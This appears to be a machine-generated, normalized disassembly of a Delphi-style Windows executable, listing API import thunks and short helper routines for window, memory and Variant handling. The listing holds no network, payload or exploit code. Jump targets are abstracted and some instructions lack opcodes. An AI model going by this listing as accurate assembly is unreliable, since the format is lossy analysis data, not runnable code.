jmp [ GetTextMetricsA@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
Polyline
jmp [ __import_lookup_table_8(gdi32:Polyline) ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginPaint
jmp [ __import_lookup_table_9(user32:BeginPaint) ]
BringWindowToTop
jmp [ __import_lookup_table_9(user32:BringWindowToTop) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ __import_lookup_table_9(user32:CallWindowProcA) ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ CharToOemA@IAT ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFocusRect
jmp [ __import_lookup_table_9(user32:DrawFocusRect) ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndPaint
jmp [ EndPaint@IAT ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetCursorPos
jmp [ GetCursorPos@IAT ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetLastInputInfo
jmp [ __import_lookup_table_9(user32:GetLastInputInfo) ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ __import_lookup_table_9(user32:GetParent) ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ LoadIconA@IAT ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ PtInRect@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ __import_lookup_table_9(user32:RegisterClipboardFormatA) ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ __import_lookup_table_9(user32:SetParent) ]
SetScrollInfo
jmp [ __import_lookup_table_9(user32:SetScrollInfo) ]
SetScrollRange
jmp [ __import_lookup_table_9(user32:SetScrollRange) ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
TrackPopupMenu
jmp [ __import_lookup_table_9(user32:TrackPopupMenu) ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ __import_lookup_table_9(user32:TranslateMessage) ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ __import_lookup_table_9(user32:WaitMessage) ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ WindowFromPoint@IAT ]
sub_406760
call GetTickCount
retn
sub_406768
xor eax eax
retn
sub_40676c
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_40677c
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406798
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_4067ac
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_4067e4
call sub_406754
retn
sub_4067ec
call sub_406754
retn
CreateWindowExA
jmp [ CreateWindowExA@IAT ]
sub_4069c9
jmp sub_40382c
sub_4069d0
pop ebp
retn
sub_4069d4
sub [ rw-data ] 0x1
retn
sub_406a01
jmp sub_40382c
sub_406a08
pop ebp
retn
sub_406a0c
sub [ rw-data ] 0x1
retn
sub_406d11
jmp sub_40382c
sub_406d18
pop ebp
retn
sub_406d1c
sub [ rw-data ] 0x1
retn
sub_4077f1
add eax 0xffffffd4
jmp sub_40c954
sub_4077f9
add eax 0xffffffd4
jmp sub_40c9f0
sub_40780b
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4055bc
sub_407815
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4055d0
sub_407b44
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407b0c
test eax eax
sete al
pop esi
pop ebx
retn
sub_40805c
call sub_408038
retn
sub_4080f4
push eax
call CloseHandle
retn
sub_40827c
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408290
push esi
mov esi eax
xchg edx eax
call sub_4028c8
mov eax esi
pop esi
retn
sub_408450
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_4040a4
pop esi
pop ebx
retn
sub_408464
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026cc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_408478
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408518
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402828
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_40853c
push ebx
mov ebx eax
mov eax ebx
call sub_403eac
pop ebx
retn
sub_40889f
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403eac
pop eax
pop ebx
retn
sub_408b34
popad
mov eax [ eax ]
mov ebp 0xf400408b
mov eax [ eax ]
hlt
sub_408b57
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_408cb2
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40900f
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40900f
sub_4090cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40436c
mov edx esi
xor ecx ecx
call sub_408f58
pop esi
pop ebx
retn
sub_409140
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40436c
mov edx esi
mov cl 0x1
call sub_408f58
pop esi
pop ebx
retn
sub_4097ba
jmp sub_40382c
sub_4097c1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4098b2
jmp sub_40382c
sub_4098b9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a05d
jmp sub_40382c
sub_40a064
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a0ec
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a090
pop ebp
retn 0x8
sub_40a231
jmp sub_40382c
sub_40a238
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40a6db
jmp sub_40382c
sub_40a6e2
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40abc7
jmp sub_40382c
sub_40abce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ac79
jmp sub_40382c
sub_40ac80
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40ad23
jmp sub_40382c
sub_40ad2a
pop esi
pop ecx
pop ebp
retn
sub_40af06
jmp sub_40382c
sub_40af0d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40af64
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b256
jmp sub_40382c
sub_40b324
jmp sub_40382c
sub_40b34c
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_4030a4
sub_40b4e8
jmp sub_40382c
sub_40b4ef
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b4f8
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403864
sub_40b505
retn
sub_40b508
push ebp
mov ebp esp
call sub_40b44c
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b4f8
pop ebp
retn 0x4
sub_40b524
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
retn
sub_40b5bc
push ebx
mov ebx eax
mov eax ebx
call sub_40b53c
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40b78f
jmp sub_40382c
sub_40b796
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b85b
jmp sub_40382c
sub_40b862
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40b86c
call sub_40b0f8
mov eax 0x1
call sub_403e10
sub_40b9f0
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bac9
jmp sub_40382c
sub_40bae6
jmp sub_40382c
sub_40baed
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40bb98
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bafc
mov ecx eax
sub_40bd84
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40bda4
push eax
call CharNextA
retn
sub_40c03c
jmp sub_40382c
sub_40c043
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c0ac
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c503
jmp sub_40382c
sub_40c50a
pop ebx
mov esp ebp
pop ebp
retn
Sleep
jmp [ __import_lookup_table_10(kernel32:Sleep) ]
sub_40c648
jmp sub_40382c
sub_40c64f
pop ebx
mov esp ebp
pop ebp
retn
sub_40c654
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40c5b8
sub_40c664
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40c680
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026ec
pop ebx
retn
sub_40c708
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40c714
xchg [ eax ] edx
mov eax edx
retn
sub_40c774
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40c804
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40c91c
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40c944
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40cbbf
jmp sub_40382c
sub_40cbc6
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40cc34
jmp sub_40382c
sub_40cc3b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cc59
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40cc52
jmp sub_40382c
sub_40cc59
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d0a9
jmp sub_40382c
sub_40d0b0
pop ebp
retn
sub_40d11c
jmp sub_40382c
sub_40d123
pop ebp
retn
VariantInit
jmp [ __import_lookup_table_11(oleaut32:VariantInit) ]
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d19c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d202
jmp sub_40382c
sub_40d209
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d26e
jmp sub_40382c
sub_40d275
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d2da
jmp sub_40382c
sub_40d2e1
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d346
jmp sub_40382c
sub_40d34d
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d3b2
jmp sub_40382c
sub_40d3b9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d431
jmp sub_40382c
sub_40d438
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40d4a4
jmp sub_40382c
sub_40d4ab
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d514
jmp sub_40382c
sub_40d51b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40d588
jmp sub_40382c
sub_40d58f
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_40d915
jmp sub_40382c
sub_40d91c
pop ebp
retn
sub_40d920
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40d5e4
sub_40d931
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40df52
jmp sub_40382c
sub_40df59
pop ecx
pop ebp
retn
sub_40dfeb
jmp sub_40382c
sub_40dff2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e042
jmp sub_40382c
sub_40e049
pop ecx
pop ebp
retn
sub_40e0db
jmp sub_40382c
sub_40e0e2
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e132
jmp sub_40382c
sub_40e139
pop ecx
pop ebp
retn
sub_40e381
jmp sub_40382c
sub_40e388
pop ebx
mov esp ebp
pop ebp
retn
sub_40e41a
jmp sub_40382c
sub_40e421
pop ecx
pop ebp
retn
sub_40e424
push ebx
mov ebx eax
mov eax ebx
call sub_40e6bc
mov [ ebx ] 0x1
pop ebx
retn
sub_40e6bc
test [ eax ] 0xbfe8
jne r-xdata
call sub_40e640
retn
mov [ eax ] 0x0
retn
sub_40e6d0
push eax
call sub_40e6bc
pop eax
retn
sub_40e930
call sub_40e9e4
retn
sub_40eb4e
jmp sub_40382c
sub_40eb55
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ebf9
jmp sub_40382c
sub_40ec00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ec22
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4045a4
retn
sub_40ec1b
jmp sub_40382c
sub_40ec22
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ec7e
jmp sub_40382c
sub_40ec85
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ed01
jmp sub_40382c
sub_40f247
jmp sub_40382c
sub_40f24e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f2e1
jmp sub_40382c
sub_40f2e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f305
lea eax [ ebp - 0x14 ]
call sub_40458c
retn
sub_40f2fe
jmp sub_40382c
sub_40f305
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f362
jmp sub_40382c
sub_40f369
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f40b
jmp sub_40382c
sub_40f428
jmp sub_40382c
sub_40f42f
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40f98a
jmp sub_40382c
sub_40f991
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fa3c
push eax
call sub_40e6bc
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_40fa50
push eax
call sub_40e6bc
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_40fac8
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40e9e4
add esp 0x10
sub_40fd72
jmp sub_40382c
sub_40fd79
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40fdbc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40e6bc
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_40fdd4
mov edx 0x80020004
call sub_40fdbc
retn
sub_40fe65
jmp sub_40382c
sub_40fe6c
pop esi
pop ebx
pop ebp
retn
sub_40fe70
push ebp
mov ebp esp
call sub_410030
pop ebp
retn 0x4
sub_40fefc
push ebp
mov ebp esp
call sub_410030
pop ebp
retn 0x4
sub_40ffdf
jmp sub_40382c
sub_40ffe6
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4030e0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40344c
sub_410008
xor eax eax
retn
sub_41000c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410020
mov [ ecx ] 0x8
mov al 0x1
retn
sub_410028
call sub_40df08
retn
sub_410030
call sub_40dff8
retn
sub_410038
call sub_40e3d0
retn
sub_410040
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_410054
call sub_410030
retn
sub_41005c
push ebp
mov ebp esp
call sub_410038
pop ebp
retn 0x8
sub_410074
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_410150
jmp sub_40382c
sub_410219
jmp sub_40382c
sub_410220
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41023d
lea eax [ ebp - 0x10 ]
call sub_403eac
retn
sub_410236
jmp sub_40382c
sub_41023d
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410248
call sub_40e424
retn
sub_4102bf
jmp sub_40382c
sub_4102c6
pop ebp
retn
sub_410369
jmp sub_40382c
sub_410370
pop ebp
retn
sub_410499
jmp sub_40382c
sub_4104a0
pop ebp
retn
sub_4104a4
sub [ rw-data ] 0x1
retn
sub_4104d8
xor edx edx
mov dl [ eax + 0x1 ]
lea eax [ eax + edx + 0x2 ]
retn
sub_41075c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403f00
pop esi
pop ebx
retn
sub_4107f8
jmp sub_40382c
sub_4107ff
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4108fa
jmp sub_40382c
sub_410901
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_410b00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40e9e4
pop esi
pop ebx
retn
sub_410c82
jmp sub_40382c
sub_410c89
pop ebp
retn
sub_410c8c
sub [ rw-data ] 0x1
retn
sub_410cb9
jmp sub_40382c
sub_410cc0
pop ebp
retn
sub_410cc4
sub [ rw-data ] 0x1
retn
sub_4115a9
add [ esp + 0x4 ] 0xfffffff8
jmp sub_414070
sub_4120a5
add [ esp + 0x4 ] 0xffffffd8
jmp sub_41a2fc
sub_41241c
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_412540
mov eax [ eax + 0xc ]
call sub_413704
retn
sub_412817
jmp sub_40382c
sub_41281e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412824
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_4138bc
test eax eax
setge al
pop esi
pop ebx
retn
sub_412b27
jmp sub_40382c
sub_412b2e
mov esp ebp
pop ebp
retn
sub_412bfc
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_412c08
push ebx
mov ebx edx
mov edx ebx
call sub_412a1c
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_41277c
sub_412cb4
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_412e0f
jmp sub_40382c
sub_412ee3
jmp sub_40382c
sub_412ef4
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_412f60
jmp sub_40382c
sub_412f67
pop ebx
mov esp ebp
pop ebp
retn
sub_412fb2
jmp sub_40382c
sub_412fb9
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_413045
jmp sub_40382c
sub_41304c
pop ebx
pop ebp
retn
sub_413092
jmp sub_40382c
sub_413099
pop ebx
pop ebp
retn
sub_4130de
jmp sub_40382c
sub_4130e5
pop ebx
pop ebp
retn
sub_41312f
jmp sub_40382c
sub_413136
pop esi
pop ebx
pop ebp
retn
sub_41318a
jmp sub_40382c
sub_413191
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_4132be
jmp sub_40382c
sub_413394
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_4139fc
sub_413484
jmp sub_40382c
sub_41360e
jmp sub_40382c
sub_413615
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4136af
jmp sub_40382c
sub_4136b6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4136d5
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_4136ce
jmp sub_40382c
sub_4136d5
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_413738
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_413a58
xor edx edx
mov eax ebx
call sub_413a1c
pop ebx
retn
sub_4137b0
mov eax [ ebp + 0x4 ]
retn
sub_4137e6
pop ecx
pop edx
pop esi
pop ebx
retn
sub_413834
jmp sub_40382c
sub_41383b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413840
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_413858
xor edx edx
call sub_413860
retn
sub_413948
mov edx [ eax + 0x8 ]
dec edx
call sub_413860
retn
sub_413ac8
retn
sub_413b82
jmp sub_40382c
sub_413b89
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_40344c
sub_413c18
jmp sub_40382c
sub_413c1f
pop ebx
pop ecx
pop ebp
retn
sub_413c24
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_413c7b
jmp sub_40382c
sub_413c82
pop ebx
pop ecx
pop ebp
retn
sub_413c88
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_413cc4
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b27c
call sub_403864
retn
sub_413cdc
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_413db7
retn
sub_413e5c
test edx edx
je r-xdata
xor edx edx
call sub_413e70
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_413f26
jmp sub_40382c
sub_413f2d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413f40
xchg edx eax
call sub_413e70
retn
sub_413f48
retn
sub_413fe1
jmp sub_40382c
sub_413fe8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4141a5
jmp sub_40382c
sub_4141ac
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414240
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
or eax 0xffffffff
retn
